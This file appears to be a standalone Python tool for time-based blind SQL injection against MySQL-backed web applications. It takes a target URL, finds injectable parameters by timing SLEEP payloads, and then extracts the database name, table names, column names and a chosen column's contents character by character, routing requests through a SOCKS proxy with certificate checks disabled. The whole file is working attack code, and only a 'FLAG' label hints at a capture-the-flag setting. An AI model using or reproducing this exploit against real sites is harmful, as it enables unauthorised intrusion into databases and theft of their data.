import urllib
import requests
import urllib3
from pathlib import Path
from colorama import Fore, Style, init
import string
import time
import sys


init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def load_order_by_payloads(filename: str):
    file_path = Path("payloads") / filename

    payloads = {
        "single_quote": [],
        "double_quote": [],
        "no_quote": []
    }

    with open(file_path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue

            if line.startswith("single_quote:"):
                payloads["single_quote"].append(line.split(":", 1)[1].strip())

            elif line.startswith("double_quote:"):
                payloads["double_quote"].append(line.split(":", 1)[1].strip())

            elif line.startswith("no_quote:"):
                payloads["no_quote"].append(line.split(":", 1)[1].strip())

    return payloads

def discovery_vulnerability(url, payloads):
    
    proxies = {
    'http': 'socks5h://127.0.0.1:12334',
    'https': 'socks5h://127.0.0.1:12334'
}
    
    result = []
    for quote_type, payload_list in payloads.items():
        
        response_times = [] 
        for payload in payload_list:
            target_url = url + urllib.parse.quote(payload)
            
            for attempt in range(3):
                try:
                    time.sleep(0.5) 
                    
                    r = requests.get(target_url,proxies=proxies,verify=False, timeout=10)
                    
                   
                    duration = r.elapsed.total_seconds()
                    response_times.append(duration)
                    break 
                    
                except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                    if attempt < 2:
                        print(f"[-] Connection lost/reset (Attempt {attempt + 1}/3). Retrying in 5 seconds...")
                        time.sleep(5)
                    else:
                        print(f"[!] Critical error with payload: {payload}. Server is not responding.")
                        response_times.append(0.0) 

        is_vulnerable = len(response_times) >= 2 and response_times[0] < 1.0 and response_times[1] >= 2.5

        result.append({
            "type": quote_type,
            "response": response_times,
            "vulnerable": is_vulnerable
        })

        if is_vulnerable:
            print(Fore.GREEN + f"VULNERABLE (UNSAFE) --> {quote_type} (Normal: {response_times[0]:.2f}s | Sleep: {response_times[1]:.2f}s)" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"SAFE --> {quote_type}" + Style.RESET_ALL)

    return result


def exploit(data, url):
    

    session = requests.Session()
    session.proxies = {
                'http': 'socks5h://127.0.0.1:12334',
                'https': 'socks5h://127.0.0.1:12334'
            }

    results = {
        "db_name": "",
        "table_names": "",
        "column_names": "",
        "dumped_data": ""
    }


    chars = (
    string.ascii_letters +      
    string.punctuation +         
    string.digits             
)
    for item in data:

        if not item["vulnerable"]:
            continue

        for i in range(1, 51):

            if item["type"] == "single_quote":
                payload = f"' AND 1=IF((SELECT LENGTH(DATABASE()))={i}, SLEEP(3), 0)#"

            elif item["type"] == "double_quote":
                payload = f'" AND 1=IF((SELECT LENGTH(DATABASE()))={i}, SLEEP(3), 0)#'

            elif item["type"] == "no_quote":
                payload = f" AND 1=IF((SELECT LENGTH(DATABASE()))={i}, SLEEP(3), 0)"

            full_url = url + urllib.parse.quote(payload)
            duration = 0.0 

            for attempt in range(3):
                try:
                    
                    r = session.get(full_url, verify=False, timeout=10)
                    duration = r.elapsed.total_seconds()
                    break  

                except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                    if attempt < 2:
                        print(Fore.YELLOW + f"[-] Connection error at length {i} (Attempt {attempt + 1}/3). Retrying in 4 seconds..." + Style.RESET_ALL)
                        time.sleep(4)
                    else:
                        print(Fore.RED + f"[!] Critical error: Server is not responding at length {i} after 3 attempts." + Style.RESET_ALL)
                        duration = 99.0 

           
            
            if 2.5 <= duration < 90.0:
                print(Fore.GREEN + f"\n[+] Success! Database length is: {i} (Response time: {duration:.2f}s)" + Style.RESET_ALL)
                results["length_database"] = i  
                break  
            
            else:
                
                if duration == 99.0:
                    print(Fore.RED + f"[-] Length {i} skipped due to network error." + Style.RESET_ALL)
                else:
                    print(f"[-] Length {i} is incorrect (Response time: {duration:.2f}s)")
        
        
        for i in range(1, results["length_database"] + 1):


            for char in chars:

                if item["type"] == "single_quote":
                    payload = f"' AND 1=IF((SELECT SUBSTRING(DATABASE(),{i},1))='{char}',SLEEP(3),0)#"

                elif item["type"] == "double_quote":
                    payload = f'" AND 1=IF((SELECT SUBSTRING(DATABASE(),{i},1))="{char}",SLEEP(3),0)#'

                elif item["type"] == "no_quote":
                    payload = f" AND 1=IF((SELECT SUBSTRING(DATABASE(),{i},1))='{char}',SLEEP(3),0)#"
            
                full_url = url + urllib.parse.quote(payload)
                duration = 0.0

                for attempt in range(3):
                    try:
                        r = session.get(full_url, verify=False, timeout=10)
                        duration = r.elapsed.total_seconds()
                        break 
                                    
                    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                        if attempt < 2:  
                            print(Fore.YELLOW + f"[-] Connection error at Position {i} (Char: '{char}') - Attempt {attempt + 1}/3. Retrying in 4 seconds..." + Style.RESET_ALL)
                            time.sleep(4)
                        else:
                                        
                            print(Fore.RED + f"[!] Critical error: Server is not responding at Position {i} (Char: '{char}') after 3 attempts." + Style.RESET_ALL)
                            duration = 99.0
            
                
                if 2.5 <= duration < 90.0:
                    print(Fore.GREEN + f"[+] Position {i}: Found character '{char}'! (Response time: {duration:.2f}s)" + Style.RESET_ALL)
                    results["db_name"] += char 
                    break  
                                
                else:
                    
                    if duration == 99.0:
                        print(Fore.RED + f"[-] Position {i}, Char '{char}' skipped due to network error." + Style.RESET_ALL)
                    else:
                                        
                        print(f"[-] Position {i}: '{char}' is incorrect")


        print(Fore.GREEN + f"\n[+] DATABASE NAME LOCALIZED: {results['db_name']}\n" + Style.RESET_ALL)
        for i in range(1, 100):
            
            found_any = False
            

            for char in chars:
                
                ascii = ord(char)
                        
                if item["type"] == "single_quote":
                    
                    payload = f"' AND 1=IF(ASCII(SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{results['db_name']}'), {i}, 1))={ascii}, SLEEP(3), 0)#"

                elif item["type"] == "double_quote":
                    payload = f'" AND 1=IF(ASCII(SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=\'{results["db_name"]}\'), {i}, 1))={ascii},SLEEP(3) , 0)#'

                elif item["type"] == "no_quote":
                    payload = f" AND 1=IF(ASCII(SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{results['db_name']}'), {i}, 1))={ascii}, SLEEP(3), 0)"

                full_url = url + urllib.parse.quote(payload)
                duration = 0.0

                for attempt in range(3):
                    try:
                        r = session.get(full_url, verify=False, timeout=10)
                        duration = r.elapsed.total_seconds()
                        break
                    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                        if attempt < 2:  
                            print(Fore.YELLOW + f"[-] Connection error at Position {i} (Char: '{char}') - Attempt {attempt + 1}/3. Retrying in 4 seconds..." + Style.RESET_ALL)
                            time.sleep(4)
                        else:
                            print(Fore.RED + f"[!] Critical error: Server is not responding at Position {i} (Char: '{char}') after 3 attempts." + Style.RESET_ALL)
                            duration = 99.0

                if 2.5 <= duration < 90.0:
                    print(Fore.GREEN + f"[+] Position {i}: Found character '{char}'! (Response time: {duration:.2f}s)" + Style.RESET_ALL)
                    results["table_names"] += char
                    found_any = True
                    break  
                                
                else:
                    if duration == 99.0:
                        print(Fore.RED + f"[-] Position {i}, Char '{char}' skipped due to network error." + Style.RESET_ALL)
                        
                    else:
                                        
                        print(f"[-] Position {i}: '{char}' is incorrect")

            if not found_any:
                            print(f"\n[!] No character found at Position {i}. Reached the end of data.")
                            break 
            
        table_list = results["table_names"].split(",")
        print(Fore.GREEN + f"\n[+] Table available: {table_list}\n" + Style.RESET_ALL)

        selected_table = input("enter a table name: ").strip()

        if selected_table in table_list:
    
            for i in range(1, 100):
                found_any = False

                for char in chars:
                     
                    if item["type"] == "single_quote":
                        payload = f"' AND 1=IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{results['db_name']}' AND table_name='{selected_table}'), {i}, 1)='{char}', SLEEP(3), 0)#"

                    elif item["type"] == "double_quote":
                        payload = f"\"AND 1=IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{results['db_name']}' AND table_name='{selected_table}'), {i}, 1)='{char}', SLEEP(3), 0)#"

                    elif item["type"] == "no_quote":
                        payload = f" AND 1=IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{results['db_name']}' AND table_name='{selected_table}'), {i}, 1)='{char}', SLEEP(3), 0)"       
                    
                    full_url = url + urllib.parse.quote(payload)
                    duration = 0.0

                    for attempt in range(3):
                        try:
                            r = session.get(full_url, verify=False, timeout=10)
                            duration = r.elapsed.total_seconds()
                            break
                        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                            if attempt < 2:  
                                print(Fore.YELLOW + f"[-] Connection error at Position {i} (Char: '{char}') - Attempt {attempt + 1}/3. Retrying in 4 seconds..." + Style.RESET_ALL)
                                time.sleep(4)
                            else:
                                print(Fore.RED + f"[!] Critical error: Server is not responding at Position {i} (Char: '{char}') after 3 attempts." + Style.RESET_ALL)
                                duration = 99.0

                    if 2.5 <= duration < 90.0:
                        print(Fore.GREEN + f"[+] Position {i}: Found character '{char}'! (Response time: {duration:.2f}s)" + Style.RESET_ALL)
                        results["column_names"] += char
                        found_any = True
                        break  
                                    
                    else:
                        if duration == 99.0:
                            print(Fore.RED + f"[-] Position {i}, Char '{char}' skipped due to network error." + Style.RESET_ALL)
                        else:
                                            
                            print(f"[-] Position {i}: '{char}' is incorrect")

                if not found_any:
                                print(f"\n[!] No character found at Position {i}. Reached the end of data.")
                                break 
            
        column_list = results["column_names"].split(",")
        print(Fore.GREEN + f"\n[+] Columns available: {column_list}\n" + Style.RESET_ALL)

        selected_column = input("enter a column name: ").strip()

        if selected_column in column_list:

            for i in range(1, 100):
                found_any = False

                for char in chars:
                    ascii_val = ord(char)

                    if item["type"] == "single_quote":
                        payload = f"' AND 1=IF(ASCII(SUBSTRING((SELECT {selected_column} FROM {selected_table} LIMIT 0,1), {i}, 1))={ascii_val}, SLEEP(3), 0)#"

                    elif item["type"] == "double_quote":
                        payload = f"\" AND 1=IF(ASCII(SUBSTRING((SELECT {selected_column} FROM {selected_table} LIMIT 0,1), {i}, 1))={ascii_val}, SLEEP(3), 0)#"

                    elif item["type"] == "no_quote":
                        payload = f" AND 1=IF(ASCII(SUBSTRING((SELECT {selected_column} FROM {selected_table} LIMIT 0,1), {i}, 1))={ascii_val}, SLEEP(3), 0)"

                    full_url = url + urllib.parse.quote(payload)
                    duration = 0.0

                    for attempt in range(3):
                        try:
                            r = session.get(full_url, verify=False, timeout=10)
                            duration = r.elapsed.total_seconds()
                            break
                        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                            if attempt < 2:  
                                print(Fore.YELLOW + f"[-] Connection error at Position {i} (Char: '{char}') - Attempt {attempt + 1}/3. Retrying in 4 seconds..." + Style.RESET_ALL)
                                time.sleep(4)
                            else:
                                print(Fore.RED + f"[!] Critical error: Server is not responding at Position {i} (Char: '{char}') after 3 attempts." + Style.RESET_ALL)
                                duration = 99.0

                    if 2.5 <= duration < 90.0:
                        print(Fore.GREEN + f"[+] Position {i}: Found character '{char}'! (Response time: {duration:.2f}s)" + Style.RESET_ALL)
                        results["dumped_data"] += char
                        found_any = True
                        break  
                                    
                    else:
                        if duration == 99.0:
                            print(Fore.RED + f"[-] Position {i}, Char '{char}' skipped due to network error." + Style.RESET_ALL)
                        else:
                                            
                            print(f"[-] Position {i}: '{char}' is incorrect")

                if not found_any:
                                print(f"\n[!] No character found at Position {i}. Reached the end of data.")
                                break 
            
        print(Fore.GREEN + f"\n[🚀] DUMPED DATA/FLAG: {results['dumped_data']}\n" + Style.RESET_ALL)
        sys.exit(0)


        print(results)
        return results


if __name__ == "__main__":
    try:
        target_url = input("Enter URL: ").strip()
        if not target_url:
            exit("[!] URL is empty.")

        loaded_payloads = load_order_by_payloads("blind.txt")
        results = discovery_vulnerability(target_url, loaded_payloads)

        
        if results:
            function_exploit = exploit(results, target_url)

    except KeyboardInterrupt:
        exit("\n[!] Exiting...")